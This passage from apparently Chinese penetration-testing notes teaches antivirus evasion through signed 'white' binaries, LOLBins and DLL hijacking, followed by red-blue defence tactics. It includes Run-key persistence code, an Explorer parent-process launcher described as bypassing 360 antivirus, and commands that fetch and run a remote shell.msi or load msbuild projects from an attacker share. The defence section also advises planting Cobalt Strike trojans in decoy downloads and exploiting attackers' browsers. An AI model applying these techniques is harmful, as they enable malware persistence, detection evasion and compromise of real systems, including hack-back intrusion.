v4 = 2 * v2;  if ( *(WCHAR *)((char *)&amp;Buffer + v4) != 92 )  {    *(WCHAR *)((char *)&amp;Buffer + v4) = 92;    v12[v4 / 2] = 0;  }  sub_300018D4(&amp;Buffer, 262, L"msi.dll");  hModule = LoadLibraryExW(&amp;Buffer, 0, 8u);  if ( !hModule )  {    hModule = LoadLibraryW(L"msi.dll");    if ( !hModule )      return 0;  }  v7 = GetProcAddress(hModule, "MsiGetProductCodeW");  v6 = GetProcAddress(hModule, "MsiProvideQualifiedComponentExW");  if ( !v6 )  {    FreeLibrary(hModule);    return 0;  }  if ( a1 )  {    if ( !v7 )    {      FreeLibrary(hModule);      return 0;    }    v5 = ((int (__stdcall *)(int, char *))v7)(a1, &amp;v13);    if ( !v5 )    {      v8 = 260;      v5 = ((int (__stdcall *)(_DWORD, _DWORD, _DWORD, char *, _DWORD, _DWORD, WCHAR *, int *))v6)(             L"{24AAE126-0911-478F-A019-07B875EB9996}",             L"wwlib.dll",             0,             &amp;v13,             0,             0,             &amp;LibFileName,             &amp;v8);      if ( !v5 )        goto LABEL_22;    }    if ( v5 == 1602 )      goto LABEL_22;  }  v8 = 260;  if ( !((int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, WCHAR *, int *))v6)(          L"{24AAE126-0911-478F-A019-07B875EB9996}",          L"wwlib.dll",          0,          0,          0,          0,          &amp;LibFileName,          &amp;v8) )LABEL_22:    v1 = LoadLibraryW(&amp;LibFileName);  FreeLibrary(hModule);  return v1;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">HKEY hKey;//打开启动项Key long lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &amp;hKey);if (lRet == ERROR_SUCCESS){char pFileName[MAX_PATH] = { 0 };//得到程序自身的全路径 DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH);//添加一个子Key,并设置值 // 下面的"getip"是应用程序名字（不加后缀.exe）lRet = RegSetValueEx(hKey, "Run360", 0, REG_SZ, (BYTE *)pFileName, dwRet);//关闭注册表 RegCloseKey(hKey);if (lRet != ERROR_SUCCESS){//AfxMessageBox("系统参数错误,不能随系统启动");}}MessageBoxA(NULL, "test!!!", NULL, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="通过0DAY漏洞实现父进程白文件启动（四）"><a href="#通过0DAY漏洞实现父进程白文件启动（四）" class="headerlink" title="通过0DAY漏洞实现父进程白文件启动（四）"></a>通过0DAY漏洞实现父进程白文件启动（四）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651668932003/10e81d3a035e42ddbdbf0b356aa156b5.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651668932003/ea1a409c040a438397c8e82d62b9883a.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651668932003/f48d7ad7f8e947a1b661b8e657ccedf0.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">// Run_Explorer.cpp : 定义控制台应用程序的入口点。//#include "stdafx.h"#include &lt;windows.h&gt;#include &lt;shlwapi.h&gt;#include &lt;shlobj.h&gt;#pragma comment(lib, "shlwapi.lib")// use the shell view for the desktop using the shell windows automation to find the// desktop web browser and then grabs its view//// returns://      IShellView, IFolderView and related interfacesHRESULT GetShellViewForDesktop(REFIID riid, void **ppv){*ppv = NULL;IShellWindows *psw;HRESULT hr = CoCreateInstance(CLSID_ShellWindows, NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&amp;psw));if (SUCCEEDED(hr)){HWND hwnd;IDispatch* pdisp;VARIANT vEmpty = {}; // VT_EMPTYif (S_OK == psw-&gt;FindWindowSW(&amp;vEmpty, &amp;vEmpty, SWC_DESKTOP, (long*)&amp;hwnd, SWFO_NEEDDISPATCH, &amp;pdisp)){IShellBrowser *psb;hr = IUnknown_QueryService(pdisp, SID_STopLevelBrowser, IID_PPV_ARGS(&amp;psb));if (SUCCEEDED(hr)){IShellView *psv;hr = psb-&gt;QueryActiveShellView(&amp;psv);if (SUCCEEDED(hr)){hr = psv-&gt;QueryInterface(riid, ppv);psv-&gt;Release();}psb-&gt;Release();}pdisp-&gt;Release();}else{hr = E_FAIL;}psw-&gt;Release();}return hr;}// From a shell view object gets its automation interface and from that gets the shell// application object that implements IShellDispatch2 and related interfaces.HRESULT GetShellDispatchFromView(IShellView *psv, REFIID riid, void **ppv){*ppv = NULL;IDispatch *pdispBackground;HRESULT hr = psv-&gt;GetItemObject(SVGIO_BACKGROUND, IID_PPV_ARGS(&amp;pdispBackground));if (SUCCEEDED(hr)){IShellFolderViewDual *psfvd;hr = pdispBackground-&gt;QueryInterface(IID_PPV_ARGS(&amp;psfvd));if (SUCCEEDED(hr)){IDispatch *pdisp;hr = psfvd-&gt;get_Application(&amp;pdisp);if (SUCCEEDED(hr)){hr = pdisp-&gt;QueryInterface(riid, ppv);pdisp-&gt;Release();}psfvd-&gt;Release();}pdispBackground-&gt;Release();}return hr;}HRESULT ShellExecInExplorerProcessOnOK(PCWSTR pszFile){IShellView *psv;HRESULT hr = GetShellViewForDesktop(IID_PPV_ARGS(&amp;psv));if (SUCCEEDED(hr)){IShellDispatch2 *psd;hr = GetShellDispatchFromView(psv, IID_PPV_ARGS(&amp;psd));if (SUCCEEDED(hr)){BSTR bstrFile = SysAllocString(pszFile);hr = bstrFile ? S_OK : E_OUTOFMEMORY;if (SUCCEEDED(hr)){VARIANT vtEmpty = {}; // VT_EMPTYhr = psd-&gt;ShellExecuteW(bstrFile, vtEmpty, vtEmpty, vtEmpty, vtEmpty);SysFreeString(bstrFile);}psd-&gt;Release();}psv-&gt;Release();}return hr;}int _tmain(int argc, _TCHAR* argv[]){HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);if (SUCCEEDED(hr)){wchar_t szBuffer[MAX_PATH] = L"C:\\Users\\Debug\\Desktop\\WinWord\\testList.exe";//360 12最新漏洞ShellExecInExplorerProcessOnOK(szBuffer);CoUninitialize();}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.10-shen-tou-guo-cheng-zhong-bai-hei-li-yong-fang-shi-shang/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.10-shen-tou-guo-cheng-zhong-bai-hei-li-yong-fang-shi-shang/</url>
      
        <content type="html"><![CDATA[<h2 id="白文件利用原理-一）"><a href="#白文件利用原理-一）" class="headerlink" title="白文件利用原理(一）"></a>白文件利用原理(一）</h2><p>相信大家对白名单程序利用的手法也已经非常熟悉了，白名单程序利用其实是起源于LOLBins，全称“Living-Off-the-Land Binaries”，直白翻译为“生活在陆地上的二进制“，这个概念最初在2013年DerbyCon黑客大会由Christopher Campbell和Matt Graeber进行创造，最终Philip Goh提出了LOLBins这个概念。</p><p>什么程序才能称之为LOLBins：</p><ul><li>1、可以是带有Microsoft签名的二进制文件，可以是Microsoft系统目录中二进制文件。</li><li>2、可以是第三方认证签名程序。</li><li>3、具有对APT或红队渗透方有用的功能</li><li>4、该程序除过正常的功能外，可以做意料之外的行为。（如：执行恶意代码、绕过UAC）。</li></ul><p>本系列文章从专题34到专题63，共介绍了33个常见的白名单程序，分别为：Rundll32.exe、Msiexec.exe、MSBuild.exe、InstallUtil.exe、Mshta.exe、Regsvr32.exe、Cmstp.exe、CScript.exe、WScript.exe、Forfiles.exe、te.exe、Odbcconf.exe、InfDefaultInstall.exe、Diskshadow.exe、PsExec.exe、Msdeploy.exe、Winword.exe、Regasm.exe、Regsvcs.exe、Ftp.exe、pubprn.vbs、winrm.vbs、slmgr.vbs、Xwizard.exe、Compiler.exe、IEExec.exe、MavInject32、Presentationhost.exe、Wmic.exe、Pcalua.exe、Url.dll、zipfldr.dll、Syncappvpublishingserver.vbs。</p><p>其实还有大量的LOLBins程序可以被利用，只是有些利用条件比较苛刻，有些是用来下载而不是用来执行payload的，我从 <code>https://lolbas-project.github.io</code>等其他站点共搜集到113个，除了之前介绍的33个外，还有另外的80个白利用程序也在这做简要介绍。</p><p>由于白名单程序加载payload的<a href="https://so.csdn.net/so/search?q=%E5%85%8D%E6%9D%80&amp;spm=1001.2101.3001.7020">免杀</a>测试需要杀软的行为检测才合理，静态查杀payload或者查杀白名单程序都没有任何意义，所以这里对白名单程序的免杀效果不做评判。</p><pre class="line-numbers language-none"><code class="language-none">//带有漏洞的LOADER（白文件）#include "windows.h"#include "iostream.h"void main(){    HINSTANCE h;    h=LoadLibrary("3.dll"); //没有对当前的3.dll做hash和sig签名校验，需要对此代码进行二次开发。    typedef void (*SW)();    SW ShowMsg=(SW)GetProcAddress(h,"ShowMessage");    ShowMsg();}//加载其目录下的**3.dll**,并从中获取**ShowMessage**的地址然后动态调用//原始的dll文件（未被替换的3.dll）#include "windows.h"void ShowMessage();BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){    switch (fdwReason)    {    case DLL_PROCESS_ATTACH:        MessageBox(NULL,"2","2",MB_OK);        break;    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}void ShowMessage(){    MessageBox(NULL,"1","1",MB_OK);}//3.dll     只有一个导出函数ShowMessage(),用来弹出消息   （TEXT=1）//3.dll     Dllmain函数会在被加载时弹出消息   （TEXT=2）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="白文件利用原理-二）"><a href="#白文件利用原理-二）" class="headerlink" title="白文件利用原理(二）"></a>白文件利用原理(二）</h2><h2 id="MSBuild-exe"><a href="#MSBuild-exe" class="headerlink" title="MSBuild.exe"></a>MSBuild.exe</h2><ul><li>杀软行为检测：xml能免杀时不会触发杀软行为预警。</li><li>详细文章链接：<a href="https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;idx=1&amp;mid=2247485369&amp;scene=21&amp;sn=1c63c0fd9d2b6a6e1defa12171fad0af#wechat_redirect">https://mp.weixin.qq.com/s/1WEglPXm1Q5n6T-c4OhhXA</a></li></ul><p>Microsoft Build Engine是一个用于构建应用程序的平台，此引擎也被称为msbuild，它为项目文件提供一个XML模式，该模式控制构建平台如何处理和构建软件。Visual Studio使用MSBuild，但它不依赖于Visual Studio。通过在项目或解决方案文件中调用msbuild.exe，可以在未安装Visual Studio的环境中编译和生成程序。</p><ul><li>执行方式：</li></ul><p>msbuild.exe加载文件的方式有两种</p><pre class="line-numbers language-none"><code class="language-none">1. 本地加载执行:- %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe &lt;folder_path_here&gt;\msbuild_nps.xml  2. 远程文件执行:  wmiexec.py &lt;USER&gt;:'&lt;PASS&gt;'@&lt;RHOST&gt; cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\&lt;attackerip&gt;\&lt;share&gt;\msbuild_nps.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Msiexec-exe"><a href="#Msiexec-exe" class="headerlink" title="Msiexec.exe"></a>Msiexec.exe</h2><ul><li>杀软行为检测：执行时杀软行为预警</li><li>详细文章链接：<a href="https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;idx=1&amp;mid=2247485397&amp;scene=21&amp;sn=ed1726c119df435b194b19053bb0db53#wechat_redirect">https://mp.weixin.qq.com/s/XPrBK1Yh5ggO-PeK85mqcg</a></li></ul><p>看到msiexec可能还有点陌生，但说道.msi可能就比较熟悉了，在windows下很多软件安装就是.msi格式的。当Windows操作系统安装了Windows Installer引擎，而MSI软件包使用该引擎来 安装应用程序，解释包和安装产品的可执行程序就是我们这用到 的Msiexec.exe。</p><ul><li>执行方式：</li></ul><p>msi文件可以双击执行，也可以命令行静默执行，而且msiexec也同样支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：</p><pre class="line-numbers language-none"><code class="language-none">msiexec /q /i http://www.tidesec.com/shell/shell.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651480109081/d7572881a2284352a1d78137df85dedd.png" alt="image.png"></p><h2 id="渗透中DLL劫持与白文件利用方式（三）"><a href="#渗透中DLL劫持与白文件利用方式（三）" class="headerlink" title="渗透中DLL劫持与白文件利用方式（三）"></a>渗透中DLL劫持与白文件利用方式（三）</h2><h4 id="DLL劫持技术概述"><a href="#DLL劫持技术概述" class="headerlink" title="DLL劫持技术概述"></a>DLL劫持技术概述</h4><p><strong>Windows加载DLL的规则：</strong> 首先会尝试从当前程序所在的目录加载DLL，如果没找到则在Windows系统目录中查找，如果还是没有则会去环境变量中列出的各个目录下查找。</p><p><strong>动态链接库（DLL）劫持原理：</strong> 攻击者能够利用Windows加载DLL的规则，将需要劫持程序目录下的合法DLL替换成恶意DLL。</p><p><strong>DLL劫持技术已经存在了多年，早在2010年就被发现，那为什么我们还要不停的炒剩饭呢？因为它仍然是一种可行的方法，并且在在野的APT攻击样本中仍然占有一席之地！当越来越多的APT组织逐渐暴露在大家的视野中，它们使用的攻击载荷随之曝光，经过长期分析与研究我们发现能够挖掘或使用0day攻击的APT组织凤毛麟角，绝对部分是使用现有技术与冷门技术来进行攻击。目前大部分的软件开发者仍然没有安全意识或者是说不具备相关安全相关的技能，市面上仍然有许多经过签名的可执行文件容易受到此技术的攻击，那么作为红队我们可以将DLL劫持技术武器化，即使DLL劫持技术不是新技术也不是尖端技术，但本文章仍然会分享一些如何找到可以利用程序和应该如何构造劫持的DLL。</strong></p><h4 id="DLL劫持技术与白利用结合"><a href="#DLL劫持技术与白利用结合" class="headerlink" title="DLL劫持技术与白利用结合"></a>DLL劫持技术与白利用结合</h4><p>大部情况下，程序开发者使用LoadLibrary API动态加载DLL，该可执行程序首先将在当前目录中查找需要的DLL。只需要将合法的PE文件复制到攻击者具有读写的目录中即可，如果攻击者创建了一个恶意载荷的DLL，则合法的应用程序将加载该DLL并执行攻击者的代码，而且该PE可能已签名并且被安全软件所信任，由此可能绕过白名单机制。</p><p>接下来我们分析一个示例，我们使用一个被微软签名过的二进制软件WinWord.exe。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651480109081/6b1675d880ad4b739d68a12656262e21.png" alt="image.png"></p><p>1．该模块为Word的主模块，用于钓鱼邮件迷惑性非常大。（那么我选用白文件时优先考虑这类型的模块，可以根据具体渗透场景去选定）</p><p>2．该模块有微软的数字签名。（数字签名也是分三六九等，一般微软签名的数字证书的程序会相对一般的数字证书更安全）</p><h2 id="渗透中DLL劫持与白文件利用方式（四）"><a href="#渗透中DLL劫持与白文件利用方式（四）" class="headerlink" title="渗透中DLL劫持与白文件利用方式（四）"></a>渗透中DLL劫持与白文件利用方式（四）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651480109081/134edba4e6ff4ccab539fed8590f8f13.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">char __usercall sub_1005831@&lt;al&gt;(HINSTANCE a1@&lt;eax&gt;){  char result; // al@10  DWORD v2; // eax@13  char v3; // al@13  if ( dword_1008040    || dword_1008044    || dword_1008048    || dword_100804C    || dword_1008050    || hLibModule    || hInstance    || hWnd )  {    result = sub_1005532("Twunk   --InitApplication - Application In Use\r\n");  }  else  {    hInstance = a1;    if ( (unsigned __int8)sub_1005552()      &amp;&amp; (unsigned __int8)sub_1005602()      &amp;&amp; ((hLibModule = LoadLibraryA("TWAIN_32.DLL")) != 0 ? (v3 = 1) : (v2 = GetLastError(),                                                                         sub_1003E07(v2),                                                                         v3 = sub_1005532("Twunk   --InitTwainDll - Load TWAIN_32.DLL Failed\r\n")),          v3 &amp;&amp; (unsigned __int8)sub_1005716()) )    {      if ( GetProfileIntA("Twain", "Debug Mode", 0) )        ShowWindow(hWnd, 2);      else        ShowWindow(hWnd, 0);      result = 1;    }    else    {      result = 0;    }  }  return result;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651480109081/a95c8a0b242e4506b29aea1f1677b720.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651480109081/a4ef79cb3f0a410a948271aa65185966.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">713762E5    68 1C1F3771     push WOW32.71371F1C                      ; ASCII "msctf.dll"713762EA    FF15 58163771   call dword ptr ds:[&lt;&amp;KERNEL32.LoadLibrar&gt;; kernel32.LoadLibraryA713762F0    85C0            test eax,eax713762F2    74 17           je short WOW32.7137630B713762F4    68 0C1F3771     push WOW32.71371F0C                      ; ASCII "TF_CUASAppFix"713762F9    50              push eax713762FA    FF15 5C163771   call dword ptr ds:[&lt;&amp;KERNEL32.GetProcAdd&gt;; kernel32.GetProcAddress71376300    85C0            test eax,eax71376302    74 07           je short WOW32.7137630B71376304    68 001F3771     push WOW32.71371F00                      ; ASCII "COMLessCUAS"71376309    FFD0            call eax7137630B    C3              retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.40-hong-lan-zhong-gong-shou-liu-cheng-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.40-hong-lan-zhong-gong-shou-liu-cheng-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="0day漏洞防护"><a href="#0day漏洞防护" class="headerlink" title="0day漏洞防护"></a>0day漏洞防护</h1><p>伪装 、异构、阻断、拦截、诱捕、排查 6步法</p><p>1、伪装关键应用指纹 伪装常用中间件、更改http协议header头的server字段。可将linux改为IIS6.0。修改中间件配置文件，将移动通讯app的web服务页面配置成“错误”页面返回信息。修改网关系统配置指纹，将邮件系统指纹改为“Moresec HoneyPot”，转移攻击者注意力。</p><p>2、异构边界防护设备 （增加入侵难度和成本） vpn和防火墙采用异构方式部署，同时在内外层vpn系统网络区域间部署大量蜜罐。</p><p>3、严控出网访问 （有来无回） 攻击者需要受害主机出网访问的权限，采用配置防火墙双向白名单，阻断协议包括tcp 、udp、 icmp 、dns等，达到攻击无法完成的效果。</p><p>4、强化主机安全防护 部分0day利用成功后需要主机读写文件权限，部署终端防护系统，一是监控非白名单地址的运维操作和敏感操作命令，及时发现异常命令执行行为，包括攻击者常用的whoami 、id等。二是监控服务器敏感配置文件的读取，例如passwd、shadow、*.conf 文件。三是进制web目录写入脚本文件，防止webshell后门落地执行。</p><p>5、布置内网诱捕陷阱 一是边界区域部署办公系统蜜罐。二是在核心计算区域布置核心系统和集权系统蜜罐。三是将真实系统的非业务端口访问流量转发至蜜罐，第一时间发现内网扫描行为。</p><p>6、紧盯零日漏洞利用痕迹 一是加强敏感文件和目录监控。主机层面，流量层面、加强敏感目录读取排查，和返回包的监控。二是加强敏感命令执行监控。主机层面通过入侵检测系统替换操作者系统bash程序，形成命令执行钩子，监控敏感命令执行操作。流量层面，利用流量监测设备匹配敏感命令执行结果。</p><p>总结实战经验发现，不管什么0day漏洞，最终都需要在内网主机执行命令，主机是防护零日漏洞攻击最后也是最关键的一道关卡。</p><p>制定了以主机异常命令执行为核心，以识别网络及应用层异常行为、收敛攻击面、制定快速攻击定位及处置流程为辅助的0day漏洞防护战术。</p><p>在全网生产主机部署入侵检测系统hids，检测反弹shell等关键攻击行为。由于运维人员也会执行bash、nc等指令，为避免误报，递归分析shell日志每条命令的父进程，如果发现是web类进程调用shell则出发告警（如父进程是java、httpd 子进程是sh、python）。告警配置短信实时提醒。</p><p>部署高交互、高仿真蜜罐，将vpn、oa系统做蜜罐备份，攻防期间替换掉真实业务域名，混淆攻击者，捕获零日漏洞。同时将下载页面中vpn、oa客户端替换为cs免杀木马，在云服务器部署通过cna脚本进行上线微信提醒，一旦上线即可第一时间反制溯源。</p><p>出网管控。最小化授权，梳理资产，绘制攻击路径。</p><h1 id="0day攻击应急处置流程"><a href="#0day攻击应急处置流程" class="headerlink" title="0day攻击应急处置流程"></a>0day攻击应急处置流程</h1><p>0信任网络：</p><p>默认不信任办公网、生产网所有网络流量，基于身份属性、设备属性、设备状态、权限关系并结合密码技术实现细粒度可信网络访问度量及管控。解决了it无边界化趋势下带来的安全问题，相对传统边界模型信任但验证不同，零信任始终保持从不信任，始终验证。零信任关注的主体是数据及应用。零信任网络解决网络边界被突破后对数据及应用的过度访问带来的数据窃取，服务器沦陷等安全问题。</p><p>防护对象，改变传统安全架构中以网络为中心的防护，改为以数据为中心的安全防护，关注应用和资源。防护基础，改变传统基于”边界“的防护，改为“无边界”防护，默认不信任，做到最小权限防护。防护理念，改变传统一次认真的静态策略，改为持续评估，动态访问控制。</p><h1 id="连环陷阱的apt攻击捕获战法"><a href="#连环陷阱的apt攻击捕获战法" class="headerlink" title="连环陷阱的apt攻击捕获战法"></a>连环陷阱的apt攻击捕获战法</h1><p>基于主动防御理念，利用 动态伪装和反向水坑，对抗0day高级攻击者。该技战法以守为攻，出奇制胜，不仅捕获攻击行为，利用浏览器漏洞成功实施反制，获得了攻击者真实身份信息。</p><p>1、投递污染信息 对数据库配置、缓存配置、交互服务器配置以及令牌加密因子，写入污染信息，指向蜜罐或诱捕探针。在linux系统中主要针对history、shadow、config、ssh等核心配置文件进行伪造。尤其重视history、结合运维习惯、对其周期性的写入污染信息，能够极大几率迷惑攻击者。</p><p>2、配置虚拟进程 完成本机的诱捕陷阱后，需要对虚拟机周围形成联动的诱捕体系，以防止攻击者绕过本机陷阱，直接对网络可达的其他主机进行渗透。可通过配置虚拟进程，模仿真实的高危服务，与真实业务共同对外发布。选定具有为授权访问漏洞的数据库服务作为陷阱模板。为保证拟真性，需详细分析每个应用系统真实业务模式，针对性的部署redis、zookeeper、es、mongodb等虚拟进程。</p><p>Rinetd端口转发工具进行端口转发。对于高并发的网站类应用，mysql数据库中部署redis虚拟进程，对于消息类应用，在kafka消息队列所在虚拟机中部署zookeeper虚拟进程，</p><p>3、构造反向水坑 当捕获攻击者上传的webshell后，防守方可在其中插入js代码（探针），攻击者再次访问后会返回其操作系统和浏览器资产信息。若出现两个不同版本资产信息，则说明攻击者使用虚拟机进行攻击，继续在之前的js代码基础上插入Canvas代码（探针），获取攻击者计算机硬件信息。如cpu、显卡、电池、屏幕尺寸等。通过返回数据明确攻击者所使用的的操作系统和浏览器后，充填相关资产的漏洞验证数据，探测是否存在可利用漏洞。再确认漏洞存在后，通过该漏洞投递免杀cs木马并进行释放。溯源攻击者身份。</p><p>WebShell 跟踪技术较多本次是通过 js 脚本远程获取黑客（攻击者）基本信息，在定位到 WebShell 后，打开 WebShell 源代码加入写好的 js 脚本，为确保脚本是否有效需要是自己先测试一下，看看是否可以获取浏览者信息，确认无误根据之前记录的 WebShell 文件属性，恢复文件修改时间为写入时间！注：具体 js 脚本可根据自己的需求编写，或者根据网上的开源脚本自行扩展，开源工具如 BeeF 、或其他开源工具等！</p><h1 id="零信任架构"><a href="#零信任架构" class="headerlink" title="零信任架构"></a>零信任架构</h1><p>可实现几个关键目标：1、vpn始终在线 2、安全防御足够，有效切断攻击方的攻击链条 3、运行过程灵活自动，避免运维人力大量投入。</p><p>1.践行零信任架构体系，建立员工身份安全基准 所有员工安装安全app，绑定设备指纹和手机号，开启扫码、动态口令等强因素认证功能，系统登录都必须使用该app完成认证。</p><p>2.让攻击者看不见 第一层防御 边界防火墙设置策略，使vpn地址不对互联网开放，攻击者不能直接探测发现，无法正常攻击。员工需在app上提交合法pc的ip地址，改地址经过acl策略管理系统的自动处理，将会加入到边界防火墙的白名单列表，然后可正常发起访问。同时，在网上搭建一套高仿的vpn蜜罐，迷惑攻击者。</p><p>3.让攻击者进不去 第二层防御 对vpn加固，启用vpn客户端的专线功能，使用户电脑在建立vpn隧道的同时自动断开与其他互联网地址的通信。</p><p>4.让攻击者摸不到 第三层防御 限制从vpn设备到内网方向的网络访问权限，默认只能访问零信任安全网关。在零信任安全网关上设置策略，使所有流量进行持续认证和权限校验，</p><p>5.使用高密度异构蜜罐 蜜网：由一个蜜网管理中心进行统一调度，下设互联网、dmz、内网数据中心、海外网络汇接点和信息系统内部共五道蜜罐防线组成的蜜网。管理中心通过syslog统一收集蜜罐告警，基于ssh实现控制指令下达，综合实现蜜罐资源调度、访问控制、日志分析、态势展示等功能。</p><h1 id="ip归属地筛选方案"><a href="#ip归属地筛选方案" class="headerlink" title="ip归属地筛选方案"></a>ip归属地筛选方案</h1><p>将已知的安全ip进行去除，利用开源ip地址库对剩余ip进行归属地标注，筛选其中各公有云厂商ip，公有云ip由于其易获取，方便假设攻击工具等特点，通常被攻击者使用。</p><p>1、ip归属地过滤筛选 将第一周的来访ip进行提取，去重，排除白名单，将剩余ip进行归属地识别。提取到带有公网ip可以作为攻击机、跳板机以及远程控制服务器的云主机ip地址，将这些云主机ip进行单独提取。</p><p>2、基于时间维度分析 将演练前3个月至半年的访问数据进行提取，与演练开始后的数据进行对比，通过对比有效发现新增ip情况，新增部分往往包含演习攻击者ip。</p><p>3、基于地域维度分析 由于多地部署方式，不同数据中心所处网络位置不同，如果多个数据中心同时增加了新增访问ip，则该ip为对制定单位的攻击ip。</p><p>4、基于行为维度分析 借助威胁情报检查流量中包含的挖矿、DDOS脚本排除代理、爬虫、黑产攻击ip。</p><h1 id="基于威胁情报构筑动态防御体系"><a href="#基于威胁情报构筑动态防御体系" class="headerlink" 